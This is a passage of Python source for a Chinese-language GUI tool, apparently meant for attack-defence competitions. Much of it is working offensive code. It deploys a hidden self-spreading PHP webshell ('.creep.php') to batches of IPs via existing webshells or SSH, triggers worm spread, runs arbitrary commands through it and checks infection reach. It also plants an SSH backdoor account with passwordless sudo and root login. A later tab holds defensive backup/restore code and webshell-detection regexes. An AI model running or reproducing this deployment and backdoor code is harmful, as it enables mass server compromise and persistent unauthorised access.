                        if r.status_code != 200:
                            return ip, False, f'WebShell写入{fname}失败: HTTP{r.status_code}'
                        time.sleep(0.05)
                    time.sleep(0.3)
                    vr = s.post(f'{base}{c["shell_url"]}',
                        data={c['shell_pass']: f"echo file_exists('/{web_root}/.creep.php')&&file_exists('/{web_root}/.creep.dat')?'W_OK':'W_FAIL';"},
                        timeout=c['timeout'])
                    if 'W_OK' not in vr.text:
                        return ip, False, f'写入验证失败: {vr.text.strip()[:40] or "空响应(Shell密码/路径不对?)"}'
                    r1 = requests.get(f'{base}/.creep.php',
                        headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=c['timeout'])
                    r2 = requests.get(f'{base}/.creep.php',
                        headers={'X-Creep': c['password'], 'X-Worm': '1'}, timeout=c['timeout'])
                    res1 = r1.text.strip()[:20] if r1.status_code==200 else f'HTTP{r1.status_code}'
                    res2 = r2.text.strip()[:20] if r2.status_code==200 else f'HTTP{r2.status_code}'
                    if not res1: res1 = '(空:蠕虫密码不匹配或30秒锁)'
                    if not res2: res2 = '(空:蠕虫密码不匹配)'
                    tag = ' (https降级)' if base.startswith('https') and not c.get('https') else ''
                    return ip, True, f'部署OK{tag} | 扩散:{res1} | 蠕虫:{res2}'
                except Exception as e:
                    err = e
            return ip, False, str(err)[:60]
        except Exception as e: return ip, False, str(e)[:60]

    def deploy_one(self, ip, c):
        try:
            php_path = os.path.join(CREEP_DIR, '.creep.php')
            dat_path = os.path.join(CREEP_DIR, '.creep.dat')
            if not os.path.exists(php_path): return ip, False, f'文件不存在: {php_path}'
            if not os.path.exists(dat_path): return ip, False, f'文件不存在: {dat_path}'
            with open(php_path, 'rb') as f: php = f.read()
            with open(dat_path, 'rb') as f: dat = f.read()
            b64_php = base64.b64encode(php).decode()
            b64_dat = base64.b64encode(dat).decode()
            
            conn_mode = c.get('conn_mode', 'webshell')
            host, web_port = self._hp(ip, c)
            ssh_host = c.get('ssh_host', '').strip()
            use_ssh = conn_mode == 'ssh' and bool(ssh_host)
            if use_ssh:
                web_root = (c.get('ssh_webdir') or c.get('web_root') or '/var/www/html').strip('/')
            else:
                web_root = (c.get('web_root') or '/var/www/html').strip('/')
            
            # SSH模式
            if use_ssh:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host or host, port=c.get('ssh_port', 22), 
                           username=c.get('ssh_user', 'root'), 
                           password=c.get('ssh_pass', ''), 
                           timeout=c.get('timeout', 10))
                
                # 写入.php文件
                cmd1 = f"mkdir -p {web_root} && echo '{b64_php}' | base64 -d > {web_root.rstrip('/')}/.creep.php"
                stdin, stdout, stderr = ssh.exec_command(cmd1)
                if stdout.channel.recv_exit_status() != 0:
                    return ip, False, f'写入.php失败: {(stderr.read().decode(errors="ignore") or "")[:50]}'

                # 写入.dat文件
                cmd2 = f"echo '{b64_dat}' | base64 -d > {web_root.rstrip('/')}/.creep.dat"
                stdin, stdout, stderr = ssh.exec_command(cmd2)
                if stdout.channel.recv_exit_status() != 0:
                    return ip, False, f'写入.dat失败: {(stderr.read().decode(errors="ignore") or "")[:50]}'
                
                ssh.close()
                
                # HTTP验证（失败不阻塞）
                try:
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php', timeout=min(c['timeout'], 8))
                    htip = f'HTTP:{r.status_code}'
                except Exception as e:
                    htip = f'HTTP验证失败(不影响):{str(e)[:30]}'
                return host, True, f'SSH部署成功 | {htip}'
            
            # WebShell模式
            err = None
            for base in self._bases_for(ip, c):
                try:
                    s = _session()
                    for fname, b64data in [('.creep.php', b64_php), ('.creep.dat', b64_dat)]:
                        wpath = f'/{web_root}/{fname}'
                        cmd = f"system('echo {b64data} | base64 -d > {wpath}');"
                        self._shell_req(s, base, c, cmd)
                        time.sleep(0.05)
                    time.sleep(0.3)
                    r = s.get(f'{base}/.creep.php', timeout=c['timeout'])
                    tag = ' (https降级)' if base.startswith('https') and not c.get('https') else ''
                    return ip, r.status_code in (200,403), f'部署成功{tag}' if r.status_code in (200,403) else f'状态{r.status_code}'
                except Exception as e:
                    err = e
            return ip, False, str(err)[:50]
        except Exception as e: return ip, False, str(e)[:50]

    def do_deploy(self):
        ips = self.get_targets()
        if not ips: return
        self.set_btns(False); self.save_cfg()
        self.log_self(f'>>> 部署 Creep 到 {len(ips)} 台', 'info')
        c = self.cfg_vals()
        def run():
            ok=fail=0
            with ThreadPoolExecutor(max_workers=min(10,len(ips))) as ex:
                fs = {ex.submit(self.deploy_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f'  {"[OK]" if succ else "[FAIL]"} {ip}: {msg}', 'ok' if succ else 'fail')
                    ok+=succ; fail+=not succ
            self.log_self(f'结果: {ok}成功 {fail}失败', 'ok' if ok>=fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def spread_one(self, ip, c):
        host, web_port = self._hp(ip, c)
        base = make_base(host, web_port, c['https'])
        try:
            r = requests.get(f'{base}/.creep.php',
                headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=c['timeout'])
            return ip, 'OK' in r.text[:10], r.text.strip()[:30]
        except Exception as e: return ip, False, str(e)[:40]

    def do_spread(self):
        ips = self.get_targets()
        if not ips: return
        self.set_btns(False); self.save_cfg()
        self.log_self(f'>>> 触发扩散 到 {len(ips)} 台', 'info')
        c = self.cfg_vals()
        def run():
            ok=fail=0
            with ThreadPoolExecutor(max_workers=min(10,len(ips))) as ex:
                fs = {ex.submit(self.spread_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f'  {"[OK]" if succ else "[FAIL]"} {ip}: {msg}', 'ok' if succ else 'fail')
                    ok+=succ; fail+=not succ
            self.log_self(f'扩散完成: {ok}成功 {fail}失败', 'ok' if ok>=fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def do_check(self):
        ips = self.get_targets()
        if not ips: return
        self.log_self(f'>>> 检查扩散范围 ({len(ips)}台)', 'info')
        c = self.cfg_vals()
        def run():
            for ip in ips:
                try:
                    host, web_port = self._hp(ip, c)
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php',
                        headers={'X-Creep': c['password'], 'X-Cmd': 'find / -name ".creep.php" -type f 2>/dev/null'},
                        timeout=c['timeout'])
                    cnt = len(r.text.strip().split('\n')) if r.text.strip() and r.text.strip() != '(empty)' else 0
                    samples = r.text.strip()[:120] if cnt else '无'
                    self.log_self(f'  [{ip}] 感染目录: {cnt}', 'ok' if cnt else 'fail')
                    if cnt: self.log_self(f'    路径: {samples}', 'info')
                except Exception as e: self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        self.set_btns(False)
        async_run(run)

    def do_exec(self):
        cmd = self.e_cmd.get().strip()
        if not cmd: messagebox.showwarning('提示', '请输入命令'); return
        ips = self.get_targets()
        if not ips: return
        self.log_self(f'>>> 执行: {cmd}', 'info')
        c = self.cfg_vals()
        def run():
            for ip in ips:
                try:
                    host, web_port = self._hp(ip, c)
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php',
                        headers={'X-Creep': c['password'], 'X-Cmd': cmd}, timeout=c['timeout'])
                    self.log_self(f'[{ip}] {r.text.strip()[:300]}', 'out')
                except Exception as e: self.log_self(f'[FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def do_kill(self):
        ips = self.get_targets()
        if not ips: return
        if not messagebox.askyesno('确认', f'清除 {len(ips)} 台靶机上的 Creep webshell？'): return
        self.log_self(f'>>> 清除 Creep ({len(ips)}台)', 'warn')
        c = self.cfg_vals()
        def run():
            web_root = c.get('web_root', '/var/www/html')
            for ip in ips:
                try:
                    host, web_port = self._hp(ip, c)
                    base = make_base(host, web_port, c['https'])
                    s = _session()
                    s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']:
                        f'@unlink("{web_root}/.creep.php");@unlink("{web_root}/.creep.dat");@unlink("{web_root}/.user.ini");'
                        f'find {web_root} /tmp -name "*creep*" -type f -delete 2>/dev/null;'
                        'echo "OK";'}, timeout=c['timeout'])
                    self.log_self(f'  [OK] {ip}', 'ok')
                except Exception as e: self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    # ── SSH后门 ──
    def ssh_back_log_msg(self, msg, tag='info'):
        self.ssh_back_log.config(state=tk.NORMAL)
        self.ssh_back_log.insert(tk.END, f'[{datetime.now().strftime("%H:%M:%S")}] {msg}\n', tag)
        self.ssh_back_log.see(tk.END)
        self.ssh_back_log.config(state=tk.DISABLED)

    def do_ssh_backdoor(self):
        ips = self.get_targets()
        if not ips: return
        c = self.cfg_vals()
        backuser = self.c_ssh_backuser.get().strip() or 'backdoor'
        backpass = c['password']
        self.ssh_back_log_msg(f'>>> 植入SSH后门 到 {len(ips)} 台', 'info')
        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    s = _session()
                    cmds = [
                        f'useradd -m -s /bin/bash {backuser} 2>/dev/null; echo "{backuser}:{backpass}" | chpasswd 2>/dev/null',
                        f'usermod -aG sudo {backuser} 2>/dev/null || usermod -aG wheel {backuser} 2>/dev/null',
                        f'echo "{backuser} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null',
                        f'mkdir -p ~{backuser}/.ssh && chmod 700 ~{backuser}/.ssh && touch ~{backuser}/.ssh/authorized_keys',
                        'sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config',
                        'service sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null',
                    ]
                    for cmd in cmds:
                        s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']: cmd}, timeout=c['timeout'])
                        time.sleep(0.1)
                    self.ssh_back_log_msg(f'  [OK] {ip} 后门账号: {backuser}', 'ok')
                except Exception as e: self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def do_ssh_back_check(self):
        ips = self.get_targets()
        if not ips: return
        c = self.cfg_vals()
        backuser = self.c_ssh_backuser.get().strip() or 'backdoor'
        self.ssh_back_log_msg(f'>>> 检查SSH后门 账号: {backuser}', 'info')
        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    r = _session().post(f'{base}{c["shell_url"]}', data={c['shell_pass']: f'id {backuser} 2>/dev/null || echo "NOT_FOUND"'}, timeout=c['timeout'])
                    if 'NOT_FOUND' in r.text: self.ssh_back_log_msg(f'  [!] {ip}: 后门账号不存在', 'fail')
                    else: self.ssh_back_log_msg(f'  [OK] {ip}: {r.text.strip()[:80]}', 'ok')
                except Exception as e: self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    # ── 心跳检测 ──
    def c_hb_msg(self, msg, tag='info'):
        self.c_hb_text.config(state=tk.NORMAL)
        self.c_hb_text.insert(tk.END, f'[{datetime.now().strftime("%H:%M:%S")}] {msg}\n', tag)
        self.c_hb_text.see(tk.END)
        self.c_hb_text.config(state=tk.DISABLED)

    def toggle_creep_hb(self):
        if self.c_hb_running:
            self.c_hb_running = False
            self.btn_c_hb.config(text='\u25b6 开始心跳')
            self.c_hb_lbl.config(text='\u23f8 已停止', foreground='#6b7f9e')
            return
        ips = self.get_targets()
        if not ips: return
        self.c_hb_running = True
        self.btn_c_hb.config(text='\u23f9 停止心跳')
        interval = max(5, int(self.c_hb_int.get() or 30))
        self.c_hb_lbl.config(text=f'\u23f3 检测中', foreground='#00ff9d')
        c = self.cfg_vals()
        def run():
            while self.c_hb_running:
                alive = dead = 0
                with ThreadPoolExecutor(max_workers=min(20, len(ips))) as ex:
                    def check(ip):
                        try:
                            base = make_base(ip, c['port'], c['https'])
                            r = requests.get(f'{base}/.creep.php', timeout=c['timeout'])
                            return ip, r.status_code in (200, 403)
                        except Exception: return ip, False
                    fs = {ex.submit(check, ip): ip for ip in ips}
                    for f in as_completed(fs):
                        ip, ok = f.result()
                        if ok: alive += 1
                        else: dead += 1
                self.c_hb_msg(f'存活: {alive}/{len(ips)} 死亡: {dead}', 'alive' if alive>dead else 'dead')
                self.root.after(0, lambda a=alive, d=dead: self.c_hb_lbl.config(
                    text=f'\U0001f7e2 {a}  \U0001f534 {d}', foreground='#00ff9d' if a>d else '#ff4d6d'))
                for _ in range(interval):
                    if not self.c_hb_running: break
                    time.sleep(1)
            self.c_hb_msg('心跳监控已停止', 'info')
        threading.Thread(target=run, daemon=True).start()


# ============================================================
#  Tab 5: 综合运维 (新增)
# ============================================================
class OpsTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.root = None
        self.build_ui()

    def _exec_cmd(self, ip, cmd, port=80, https=False, timeout=10):
        """蠕虫通道优先, webshell回退, 自动多端口探测"""
        ports = []
        try:
            ep = safe_int(self.af_port.get(), 0) if hasattr(self, 'af_port') else 0
            if ep: ports.append(ep)
        except Exception: pass
        ports += [8804, 8080, 80, 8802, 8088, 8888]
        seen = set()
        ports = [p for p in ports if p and not (p in seen or seen.add(p))]
        shell_url = '/shell.php'
        shell_pass = 'cmd'
        try:
            if hasattr(self, 'af_shell'): shell_url = self.af_shell.get().strip() or '/shell.php'
            if hasattr(self, 'af_pass'): shell_pass = self.af_pass.get().strip() or 'cmd'
        except Exception: pass
        for p in ports:
            base = make_base(ip, p, https)
            s = _session()
            try:
                r = s.get(f'{base}/.creep.php',
                    headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd},
                    timeout=min(timeout, 8))
                if r.status_code == 200 and r.text.strip():
                    return r.text
            except Exception: pass
            try:
                r = s.post(f'{base}{shell_url}', data={shell_pass: cmd}, timeout=min(timeout, 8))
                if r.status_code == 200 and r.text.strip():
                    return r.text
            except Exception: pass
        return ''

    def build_ui(self):
        nbf = tb.Notebook(self.parent)
        nbf.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        # 各子页面
        f2 = tb.Frame(nbf); nbf.add(f2, text='  \U0001f4e5 备份还原  ')
        self.build_backup(f2)
        f5 = tb.Frame(nbf); nbf.add(f5, text='  \U0001f50d 木马查杀  ')
        self.build_scanner(f5)
        f6 = tb.Frame(nbf); nbf.add(f6, text='  \U0001f4ca 数据库  ')
        self.build_database(f6)
        f7 = tb.Frame(nbf); nbf.add(f7, text='  \U0001f6e1 加固基线  ')
        self.build_harden(f7)
        f8 = tb.Frame(nbf); nbf.add(f8, text='  \U0001f527 自动修复  ')
        self.build_autofix(f8)
        f9 = tb.Frame(nbf); nbf.add(f9, text='  \U0001f6ab IP黑名单  ')
        self.build_ipban(f9)
        f10 = tb.Frame(nbf); nbf.add(f10, text='  \U0001f4c5 定时备份  ')
        self.build_sched_backup(f10)

    # ── 公共: 共享目标输入 ──
    def _target_frame(self, parent):
        f = tb.LabelFrame(parent, text='目标配置', padding=4)
        f.pack(fill=tk.X)
        r = tb.Frame(f); r.pack(fill=tk.X)
        tb.Label(r, text='IP/网段:').pack(side=tk.LEFT)
        e = tb.Entry(r); e.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r, text='端口:').pack(side=tk.LEFT)
        ep = tb.Entry(r, width=5); ep.insert(0, '80'); ep.pack(side=tk.LEFT, padx=2)
        vh = tk.BooleanVar()
        tb.Checkbutton(r, text='HTTPS', variable=vh).pack(side=tk.LEFT, padx=2)
        tb.Label(r, text='超时:').pack(side=tk.LEFT)
        et = tb.Entry(r, width=3); et.insert(0, '5'); et.pack(side=tk.LEFT, padx=2)
        tb.Label(r, text='秒').pack(side=tk.LEFT)
        return e, ep, vh, et

    def _log_frame(self, parent):
        f = tb.LabelFrame(parent, text='日志', padding=4)
        f.pack(fill=tk.BOTH, expand=True, pady=4)
        lw = LogWidget(f)
        return lw

    def _btn_frame(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.X, pady=2)
        return f

    # ── 备份还原 ──
    def build_backup(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        # 连接模式
        mode_f = tk.Frame(f, bg=MON_CK['card_bg'])
        mode_f.pack(fill=tk.X, pady=(0,4))
        tk.Label(mode_f, text='连接类型:', fg=MON_CK['text'], bg=MON_CK['card_bg'],
            font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=4)
        self.bak_mode = tk.StringVar(value='local')
        for val, txt in [('local', '📁 本地'), ('ssh', '🔑 SSH')]:
            tk.Radiobutton(mode_f, text=txt, variable=self.bak_mode, value=val,
                command=self._switch_bak_mode, fg=MON_CK['text'], bg=MON_CK['card_bg'],
                selectcolor=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=6)
        # 本地面板
        self.bak_local = tk.Frame(f, bg=MON_CK['card_bg'])
        self.bak_local.pack(fill=tk.X)
        tb.Label(self.bak_local, text='本地Web目录:').pack(side=tk.LEFT)
        self.bak_webdir = tb.Entry(self.bak_local); self.bak_webdir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.bak_webdir.insert(0, '/var/www/html')
        # SSH面板
        self.bak_ssh = tk.Frame(f, bg=MON_CK['card_bg'])
        tk.Label(self.bak_ssh, text='SSH:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.bak_ssh_host = tb.Entry(self.bak_ssh, width=16); self.bak_ssh_host.pack(side=tk.LEFT, padx=2)
        tk.Label(self.bak_ssh, text='Port:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.bak_ssh_port = tb.Entry(self.bak_ssh, width=5); self.bak_ssh_port.insert(0, '22'); self.bak_ssh_port.pack(side=tk.LEFT, padx=2)
        tk.Label(self.bak_ssh, text='User:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.bak_ssh_user = tb.Entry(self.bak_ssh, width=8); self.bak_ssh_user.insert(0, 'root'); self.bak_ssh_user.pack(side=tk.LEFT, padx=2)
        tk.Label(self.bak_ssh, text='Pass:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.bak_ssh_pass = tb.Entry(self.bak_ssh, width=12); self.bak_ssh_pass.pack(side=tk.LEFT, padx=2)
        tk.Label(self.bak_ssh, text='远程目录:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.bak_ssh_dir = tb.Entry(self.bak_ssh, width=14); self.bak_ssh_dir.insert(0, '/var/www/html'); self.bak_ssh_dir.pack(side=tk.LEFT, padx=2)
        self.bak_ssh.pack_forget()
        # 操作栏
        r2 = tb.Frame(f); r2.pack(fill=tk.X, pady=4)
        self.btn_bak = tb.Button(r2, text='\U0001f4e5 备份', command=self.do_backup, bootstyle='success')
        self.btn_bak.pack(side=tk.LEFT, padx=2)
        self.btn_restore = tb.Button(r2, text='\U0001f504 还原', command=self.do_restore)
        self.btn_restore.pack(side=tk.LEFT, padx=2)
        self.btn_open_bak = tb.Button(r2, text='\U0001f4c2 打开备份目录', command=self._open_bak_dir)
        self.btn_open_bak.pack(side=tk.LEFT, padx=2)
        r3 = tb.Frame(f); r3.pack(fill=tk.X, pady=(0,4))
        tk.Label(r3, text='备份保存到:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.bak_dir_lbl = tk.Label(r3, text=self._bak_dir(), fg='#00d4ff', bg=MON_CK['card_bg'])
        self.bak_dir_lbl.pack(side=tk.LEFT, padx=4)
        self.bak_lw = self._log_frame(f)

    def _bak_dir(self):
        d = os.path.join(EXE_DIR, '防御模块', 'backup')
        try: os.makedirs(d, exist_ok=True)
        except Exception: pass
        return d

    def _open_bak_dir(self):
        d = self._bak_dir()
        try: os.startfile(d)
        except Exception as e: messagebox.showerror('错误', f'无法打开备份目录: {e}')

    def _switch_bak_mode(self):
        mode = self.bak_mode.get()
        self.bak_local.pack_forget()
        self.bak_ssh.pack_forget()
        if mode == 'local':
            self.bak_local.pack(fill=tk.X)
        elif mode == 'ssh':
            self.bak_ssh.pack(fill=tk.X)

    def do_backup(self):
        lw = self.bak_lw; lw.clear()
        mode = self.bak_mode.get()
        if mode == 'local':
            wd = self.bak_webdir.get().strip()
            if not os.path.isdir(wd): messagebox.showerror('错误', f'目录不存在: {wd}'); return
            lw.log(f'>>> 本地备份 {wd}', 'info')
            def _local():
                import tarfile
                bak_dir = self._bak_dir()
                bak_path = os.path.join(bak_dir, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.tar.gz')
                with tarfile.open(bak_path, 'w:gz') as tar: tar.add(wd, arcname=os.path.basename(wd))
                lw.log(f'[OK] 本地备份完成 ({os.path.getsize(bak_path)/1024:.1f}KB)', 'ok')
            async_run(_local)
        elif mode == 'ssh':
            host = self.bak_ssh_host.get().strip(); port = self.bak_ssh_port.get().strip()
            user = self.bak_ssh_user.get().strip(); pwd = self.bak_ssh_pass.get().strip()
            rdir = self.bak_ssh_dir.get().strip()
            if not host or not pwd: messagebox.showerror('错误', '请填写SSH信息'); return
            lw.log(f'>>> SSH远程备份 {host}:{rdir}', 'info')
            def _ssh():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    # 备份时用 -C 切换到父目录，只打包目录名，避免还原时多一层目录
                    import ntpath
                    parent_dir = ntpath.dirname(rdir.rstrip('/')) or '/var/www'
                    dir_name = ntpath.basename(rdir.rstrip('/')) or 'html'
                    stdin,stdout,stderr = ssh.exec_command(f'tar czf - -C {parent_dir} {dir_name} 2>/dev/null')
                    data = stdout.read()
                    bak_dir = self._bak_dir()
                    bak_path = os.path.join(bak_dir, f'ssh_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.tar.gz')
                    with open(bak_path, 'wb') as f: f.write(data)
                    lw.log(f'[OK] SSH备份完成 ({os.path.getsize(bak_path)/1024:.1f}KB)', 'ok')
                    ssh.close()
                except Exception as e: lw.log(f'[FAIL] SSH备份失败: {e}', 'fail')
            async_run(_ssh)

    def do_restore(self):
        lw = self.bak_lw; lw.clear()
        mode = self.bak_mode.get()
        if mode == 'local':
            wd = self.bak_webdir.get().strip()
            if not os.path.isdir(wd): messagebox.showerror('错误', f'目录不存在: {wd}'); return
            bd = self._bak_dir()
            if not os.path.isdir(bd): messagebox.showerror('错误', f'备份目录不存在: {bd}'); return
            baks = [f for f in os.listdir(bd) if f.endswith('.tar.gz')]
            if not baks: messagebox.showwarning('提示', '没有找到备份文件'); return
            import tarfile
            last = sorted(baks)[-1]; bak_path = os.path.join(bd, last)
            lw.log(f'>>> 本地还原: {last} -> {wd}', 'info')
            def run():
                try:
                    abswd = os.path.abspath(wd)
                    with tarfile.open(bak_path, 'r:gz') as tar:
                        for member in tar.getmembers():
                            if member.issym() or member.islnk(): continue
                            # tar 成员名始终用 '/'; 手动剥离顶层目录名
                            name = member.name.replace('\\', '/').lstrip('/')
                            if name in ('..', '.') or name.startswith('../') or '/../' in name:
                                continue
                            parts = name.split('/')
                            is_top_dir = len(parts) == 1
                            name = '/'.join(parts[1:]) if len(parts) > 1 else parts[0]
                            target = os.path.join(abswd, name)
                            if target != abswd and not target.startswith(abswd + os.sep):
                                continue
                            if member.isdir():
                                if not is_top_dir: os.makedirs(target, exist_ok=True)
                            else:
                                src = tar.extractfile(member)
                                if src:
                                    os.makedirs(os.path.dirname(target), exist_ok=True)
                                    with open(target, 'wb') as dst: shutil.copyfileobj(src, dst)
                    lw.log(f'[OK] 还原完成', 'ok')
                except Exception as e: lw.log(f'[FAIL] 还原失败: {e}', 'fail')
            async_run(run)
        elif mode == 'ssh':
            host = self.bak_ssh_host.get().strip(); port = self.bak_ssh_port.get().strip()
            user = self.bak_ssh_user.get().strip(); pwd = self.bak_ssh_pass.get().strip()
            rdir = self.bak_ssh_dir.get().strip()
            if not host or not pwd or not rdir: messagebox.showerror('错误', '请填写SSH信息和远程目录'); return
            bd = self._bak_dir()
            baks = sorted([f for f in os.listdir(bd) if f.startswith(('ssh_backup_', 'backup_')) and f.endswith('.tar.gz')]) if os.path.isdir(bd) else []
            if not baks: messagebox.showwarning('提示', '没有找到备份文件'); return
            bak_path = os.path.join(bd, baks[-1])
            lw.log(f'>>> SSH远程还原: {baks[-1]} -> {host}:{rdir}', 'info')
            def _ssh():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    remote = f'/tmp/yl_restore_{datetime.now().strftime("%Y%m%d%H%M%S")}.tar.gz'
                    sftp.put(bak_path, remote)
                    sftp.close()
                    # 使用 --strip-components=1 剥离顶层目录，直接解压内容到目标目录
                    stdin,stdout,stderr = ssh.exec_command(f'tar xzf {remote} -C {rdir} --strip-components=1 2>&1; rm -f {remote}; echo DONE')
                    out = stdout.read().decode('utf-8', errors='replace') + stderr.read().decode('utf-8', errors='replace')
                    ssh.close()
                    lw.log(f'[OK] 还原完成: {out[:200]}', 'ok' if 'DONE' in out else 'fail')
                except Exception as e: lw.log(f'[FAIL] 还原失败: {e}', 'fail')
            async_run(_ssh)

    def _ssh_connect(self, ip, port, user, passwd, cmd, timeout=10):
        try:
            import paramiko
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(ip, int(port), user, passwd, timeout=timeout, allow_agent=False, look_for_keys=False)
            _, stdout, stderr = c.exec_command(cmd, timeout=timeout)
            out = stdout.read().decode('utf-8', errors='replace')
            err = stderr.read().decode('utf-8', errors='replace')
            c.close()
            return out + err
        except ImportError: return '[ERROR] paramiko 未安装 (pip install paramiko)'
        except Exception as e: return f'[ERROR] {e}'

    # ── 木马查杀 ──
    def build_scanner(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='扫描配置', padding=4)
        f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='Web目录(本机):').pack(side=tk.LEFT)
        self.scan_dir = tb.Entry(r1); self.scan_dir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.scan_dir.insert(0, '/var/www/html')
        tb.Button(r1, text='\U0001f4c2 选择', command=lambda: pick_dir(self.scan_dir)).pack(side=tk.LEFT)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        self.scan_del = tk.BooleanVar()
        tb.Checkbutton(r2, text='自动删除可疑文件', variable=self.scan_del).pack(side=tk.LEFT, padx=2)
        self.btn_scan = tb.Button(r2, text='\U0001f50d 开始扫描', command=self.do_scan)
        self.btn_scan.pack(side=tk.LEFT, padx=6)
        self.scan_lw = self._log_frame(f)

    def do_scan(self):
        d = self.scan_dir.get().strip()
        if not os.path.isdir(d): messagebox.showerror('错误', f'目录不存在: {d}'); return
        lw = self.scan_lw; lw.clear()
        lw.log(f'>>> 扫描木马: {d}', 'info')
        delete = self.scan_del.get()
        PATTERNS = [
            (r'eval\s*\(\s*\$_', 'eval($_ 一句话木马'),
            (r'assert\s*\(\s*\$_', 'assert($_ 一句话木马'),
            (r'base64_decode\s*\(\s*\$_', 'base64解码后门'),
            (r'preg_replace\s*\(\s*/[^/]*e\s*', 'preg_replace /e 代码执行'),
            (r'array_map\s*\(\s*[\'"]assert[\'"]\s*,', 'array_map assert'),
            (r'call_user_func\s*\(\s*[\'"]assert[\'"]\s*,', 'call_user_func assert'),
            (r'`\s*\$_', '反引号执行($_`)'),
            (r'create_function\s*\(\s*[\'"]', 'create_function后门'),
            (r'popen\s*\(\s*\$_', 'popen后门'),
            (r'proc_open\s*\(\s*\$_', 'proc_open后门'),
            (r'move_uploaded_file\s*\(\s*\$_', '上传后门'),
            (r'gzinflate\s*\(\s*base64_decode', 'gz压缩后门'),
        ]
        def scan():
            total = sus = 0
            for root, dirs, files in os.walk(d):
                dirs[:] = [x for x in dirs if not x.startswith('.') and x not in ('node_modules','vendor','cache','runtime')]
                for fname in files:
                    ext = os.path.splitext(fname)[1].lower()
                    if ext not in ('.php','.php5','.phtml','.php7','.pht','.asp','.aspx','.jsp'): continue
                    fpath = os.path.join(root, fname); total += 1
                    try:
                        sz = os.path.getsize(fpath)
                        if sz > 10485760: continue
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh: content = fh.read(262144)
                        findings = []
                        for pat, desc in PATTERNS:
                            if re.search(pat, content, re.I): findings.append(desc)
                        if findings:
                            sus += 1; lw.log(f'  [!] {fpath}', 'warn')
                            for desc in findings: lw.log(f'      → {desc}', 'fail')
                            if delete:
                                try: os.remove(fpath); lw.log(f'      已删除', 'ok')
                                except Exception as ex: lw.log(f'      删除失败: {ex}', 'fail')
                    except Exception: pass
            lw.log(f'扫描完成: {total} 文件, {sus} 可疑', 'ok' if sus==0 else 'warn')
        async_run(scan)

    # ── 数据库 ──
    def build_database(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='MySQL连接(通过SSH)', padding=4)
        f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='IP:').pack(side=tk.LEFT)
        self.db_ip = tb.Entry(r1, width=14); self.db_ip.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='SSH端口:').pack(side=tk.LEFT)
